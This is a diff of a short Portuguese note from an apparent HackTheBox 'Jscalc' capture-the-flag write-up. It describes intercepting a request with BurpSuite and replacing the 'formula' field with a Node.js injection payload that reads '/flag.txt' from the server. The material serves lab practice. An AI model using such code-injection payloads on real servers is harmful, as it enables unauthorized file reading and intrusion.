@@ -1,4 +1,3 @@
-t
 Jscalc - HackTheBox
 
 Usando o BurpSuite para interceptar os header, daria para a gente editar a parte do {"formula":""}, então, editando para: {"formula":"require('fs').readFileSync('/flag.txt').toString();"}
